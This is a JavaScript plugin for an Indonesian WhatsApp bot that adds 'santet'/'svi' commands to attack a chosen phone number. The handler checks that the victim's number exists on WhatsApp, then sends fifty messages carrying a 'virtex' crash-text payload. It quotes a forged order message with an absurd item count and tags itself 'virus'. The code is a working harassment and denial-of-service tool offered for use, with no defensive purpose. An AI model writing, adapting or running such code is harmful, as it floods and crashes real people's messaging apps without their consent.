//let { virtex } = require('../virtex/index.js')
let virtex = require('../virtex/index.js')
let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
    if (!(isOwner || isPrems)) {
        global.dfail("owner", m, conn)
        throw false
    }
    if (!text) throw `Silahkan masukan nomor yang ingin di spam\n\nContoh: ${usedPrefix + command} 628xxxx`;
    m.reply('Virtex Meluncur BossQ...')

    let korban = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (!korban) throw 'nomor tidak valid'

    let data = (await conn.onWhatsApp(korban))[0] || {}
    if (!data.exists) throw 'nomor tidak terdaftar di whatsapp';

    let ftroli =  { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 999999999999999999999999999999999999999999999999999999999999, status: 1, surface: 1, message: wm, orderTitle: wm, sellerJid: '0@s.whatsapp.net' } } }

    let react = await conn.sendMessage(korban, {
        react: {
            text: 'Hallo Om👋',
            key: m.key
        }
    })
    try {
        for (let i = 50; i > 1; i--) {
            if (i !== 0) await conn.sendMessage(korban, {
                text: virtex,
                mentions: await conn.parseMention(virtex)
            }, { quoted: pickRandom([ftroli, react]) })
        }
        conn.reply(m.chat, `Sukses Mengirim Virtex BossQ, Ke @${korban.split`@`[0]}`, m, { mentions: [korban] })
    } catch (e) {
        console.log(e)
    }
}
handler.help = ['santet', 'svi'].map(v => v + ' <nomor>')
handler.tags = ['premium','virus']
handler.command = /^santet|svi$/i
handler.owner = true

module.exports = handler

function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}
